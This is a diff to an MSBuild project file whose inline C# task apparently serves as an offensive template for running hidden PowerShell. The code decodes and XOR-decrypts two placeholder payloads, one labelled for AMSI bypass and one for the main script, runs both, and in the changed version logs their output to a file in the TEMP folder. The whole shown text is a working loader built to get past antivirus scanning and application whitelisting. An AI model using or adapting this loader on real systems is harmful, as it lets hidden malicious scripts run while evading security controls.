@@ -10,52 +10,57 @@
     <Reference Include="System.Management.Automation"/>
       <Code Type="Class" Language="cs">
         <![CDATA[
-			using System;
-			using System.Text;
-			using System.Collections.ObjectModel;
-			using System.Management.Automation;
-			using System.Management.Automation.Runspaces;
-			using Microsoft.Build.Framework;
-			using Microsoft.Build.Utilities;
+using System;
+using System.IO;
+using System.Text;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
 
-			public class n: Task, ITask
-			{
-				public override bool Execute()
-				{
-					string ampsee = "~~AMSI~~";
-					string cmnd = "~~SCRIPT~~";
-					string key = "~~KEY~~";
+public class n: Task, ITask
+{
+	public override bool Execute()
+	{
+		string ampsee = "~~AMSI~~";
+		string cmnd = "~~SCRIPT~~";
+		string key = "~~KEY~~";
+                string path = Environment.GetEnvironmentVariable("TEMP") + "\\__" + key + ".txt";
+                StreamWriter writer = File.AppendText(path);
+                writer.AutoFlush = true;
+                Console.SetOut(writer);
+                writer.WriteLine(DateTime.Now.ToString());
+		PowerShell p = PowerShell.Create();
+		p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(ampsee), Encoding.UTF8.GetBytes(key))));
+		p.Invoke();
 
-					PowerShell p = PowerShell.Create();
-					p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(ampsee), Encoding.UTF8.GetBytes(key))));
-					p.Invoke();
-
-					p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(cmnd), Encoding.UTF8.GetBytes(key))));
-					Collection<PSObject> output = null;
-					output = p.Invoke();
-					
-					if(p.Streams.Error.Count != 0) {
-						Console.WriteLine("Error in script:\n");
-					}
-					foreach(ErrorRecord e in p.Streams.Error) {
-						Console.WriteLine(e.ToString());
-					}
-					foreach(PSObject rtnItem in output)
-					{
-						Console.WriteLine(rtnItem.ToString());
-					}
-					return true;
-				}
-				private static byte[] Zor(byte[] input, byte[] key)
-				{
-					byte[] mixed = new byte[input.Length];
-					for (int i = 0; i < input.Length; i++)
-					{
-						mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
-					}
-					return mixed;
-				}
-			}
+		p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(cmnd), Encoding.UTF8.GetBytes(key))));
+		Collection<PSObject> output = null;
+		output = p.Invoke();
+		
+		if(p.Streams.Error.Count != 0) {
+			writer.WriteLine("Error in script:\n");
+		}
+		foreach(ErrorRecord e in p.Streams.Error) {
+			writer.WriteLine(e.ToString());
+		}
+		foreach(PSObject rtnItem in output)
+		{
+			writer.WriteLine(rtnItem.ToString());
+		}
+		return true;
+	}
+	private static byte[] Zor(byte[] input, byte[] key)
+	{
+		byte[] mixed = new byte[input.Length];
+		for (int i = 0; i < input.Length; i++)
+		{
+			mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
+		}
+		return mixed;
+	}
+}
         ]]>
       </Code>
     </Task>
